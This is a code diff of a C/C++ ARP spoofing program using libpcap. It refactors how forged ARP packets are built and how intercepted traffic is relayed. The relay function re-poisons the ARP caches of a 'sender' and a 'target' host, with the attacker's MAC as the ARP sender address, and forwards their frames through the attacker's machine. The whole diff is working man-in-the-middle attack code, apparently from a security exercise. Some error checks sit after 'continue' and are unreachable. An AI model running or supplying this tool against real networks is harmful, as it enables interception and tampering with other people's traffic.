@@ -4,30 +4,38 @@ int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_
 {
     EthArpPacket packet;
 
-    copy_mac(dest_mac, packet.eth_.dmac_);
-    copy_mac(source_mac, packet.eth_.smac_);
+    memcpy(packet.eth_.dmac_, dest_mac, 6);
+    memcpy(packet.eth_.smac_, source_mac, 6);
+    // copy_mac(dest_mac, packet.eth_.dmac_);
+    // copy_mac(source_mac, packet.eth_.smac_);
     packet.eth_.type_ = htons(EthHdr::Arp);
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = 6;
     packet.arp_.pln_ = 4;
-    if (type == 0)
-    {
-        packet.arp_.op_ = htons(ArpHdr::Request);
-    }
-    else if (type == 1)
-    {
-        packet.arp_.op_ = htons(ArpHdr::Reply);
-    }
-    else
-    {
-        printf("case 0 is sending request, case 1 is sending reply\n");
-        return -1;
-    }
-    copy_mac(sender_mac, packet.arp_.smac_);
-    copy_ip(sender_ip, packet.arp_.sip);
-    copy_mac(target_mac, packet.arp_.tmac_);
-    copy_ip(target_ip, packet.arp_.tip);
+    packet.arp_.op_ = type;
+    // if (type == 0)
+    // {
+    //     packet.arp_.op_ = htons(ArpHdr::Request);
+    // }
+    // else if (type == 1)
+    // {
+    //     packet.arp_.op_ = htons(ArpHdr::Reply);
+    // }
+    // else
+    // {
+    //     printf("case 0 is sending request, case 1 is sending reply\n");
+    //     return -1;
+    // }
+
+    memcpy(packet.arp_.smac_, sender_mac, 6);
+    memcpy(packet.arp_.sip, sender_ip, 4);
+    // copy_mac(sender_mac, packet.arp_.smac_);
+    // copy_ip(sender_ip, packet.arp_.sip);
+    memcpy(packet.arp_.tmac_, target_mac, 6);
+    memcpy(packet.arp_.tip, target_ip, 4);
+    // copy_mac(target_mac, packet.arp_.tmac_);
+    // copy_ip(target_ip, packet.arp_.tip);
     int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
     if (res != 0)
     {
@@ -37,33 +45,11 @@ int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_
     return 0;
 }
 
-// int reply(const char *dev, pcap_t *pcap, u_int8_t *mac)
-// {
-//     struct pcap_pkthdr *header;
-//     const u_char *packet;
-//     int res = pcap_next_ex(pcap, &header, &packet);
-//     if (res != 1)
-//     {
-//         printf("error!\n");
-//         return -1;
-//     }
-//     EthArpPacket *arppkt;
-//     arppkt = (EthArpPacket *)packet;
-//     if (arppkt->eth_.type_ == htons(EthHdr::Arp))
-//     {
-//         if (arppkt->arp_.pro_ == htons(EthHdr::Ip4))
-//         {
-//             copy_mac(arppkt->arp_.smac_, mac);
-//         }
-//     }
-//     return 0;
-// }
-
 int reply(const char *dev, pcap_t *pcap, u_int8_t *mac, u_int8_t *ip)
 {
     struct pcap_pkthdr *header;
     const u_char *packet;
-    for (int i = 0; i < 5; i++)
+    while (1)
     {
         int res = pcap_next_ex(pcap, &header, &packet);
         if (res != 1)
@@ -73,16 +59,18 @@ int reply(const char *dev, pcap_t *pcap, u_int8_t *mac, u_int8_t *ip)
         }
         EthArpPacket *arppkt;
         arppkt = (EthArpPacket *)packet;
-        if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && if_same_ip(arppkt->arp_.sip, ip))
+        // if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && if_same_ip(arppkt->arp_.sip, ip))
+        if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && !memcmp(arppkt->arp_.sip, ip, 4))
         {
-            copy_mac(arppkt->arp_.smac_, mac);
+            // copy_mac(arppkt->arp_.smac_, mac);
+            memcpy(mac, arppkt->arp_.smac_, 6);
             break;
         }
     }
     return 0;
 }
 
-int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victim_mac, u_int8_t *gate_mac, u_int8_t *victim_ip, u_int8_t *gate_ip)
+int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sender_mac, u_int8_t *target_mac, u_int8_t *sender_ip, u_int8_t *target_ip)
 {
     while (true)
     {
@@ -100,26 +88,28 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
             break;
         }
 
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, gate_mac)) && (if_same_ip(pkt->arp_.tip, victim_ip)))
+        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, target_mac, 6)) && (!memcmp(pkt->arp_.tip, sender_ip, 4)))
         {
-            printf("where is victim?\n");
-            request(dev, pcap, gate_mac, attacker_mac, attacker_mac, victim_ip, gate_mac, gate_ip, 1);
+            printf("where is sender?\n");
+            request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, htons(ArpHdr::Request));
             continue;
         }
 
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, victim_mac)) && (if_same_ip(pkt->arp_.tip, gate_ip)))
+        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, sender_mac, 6)) && (!memcmp(pkt->arp_.tip, target_ip, 4)))
         {
-            printf("where is gate?\n");
-            request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
+            printf("where is target?\n");
+            request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, htons(ArpHdr::Request));
             continue;
         }
 
-        if (if_same_mac(pkt->eth_.smac_, victim_mac))
+        if (!memcmp(pkt->eth_.smac_, sender_mac, 6))
         {
-            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
+            if (!memcmp(pkt->eth_.dmac_, attacker_mac, 6))
             {
-                copy_mac(gate_mac, pkt->eth_.dmac_);
-                copy_mac(attacker_mac, pkt->eth_.smac_);
+                memcpy(pkt->eth_.dmac_, target_mac, 6);
+                memcpy(pkt->eth_.smac_, attacker_mac, 6);
+                // copy_mac(target_mac, pkt->eth_.dmac_);
+                // copy_mac(attacker_mac, pkt->eth_.smac_);
                 int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                 continue;
                 if (res != 0)
@@ -129,13 +119,14 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
                 }
             }
         }
-        else if (if_same_mac(pkt->eth_.smac_, gate_mac))
+        else if (!memcmp(pkt->eth_.smac_, target_mac, 6))
         {
-            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
+            if (!memcmp(pkt->eth_.dmac_, attacker_mac, 6))
             {
-
-                copy_mac(victim_mac, pkt->eth_.dmac_);
-                copy_mac(attacker_mac, pkt->eth_.smac_);
+                memcpy(pkt->eth_.dmac_, sender_mac, 6);
+                memcpy(pkt->eth_.smac_, attacker_mac, 6);
+                // copy_mac(sender_mac, pkt->eth_.dmac_);
+                // copy_mac(attacker_mac, pkt->eth_.smac_);
                 int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                 continue;
                 if (res != 0)
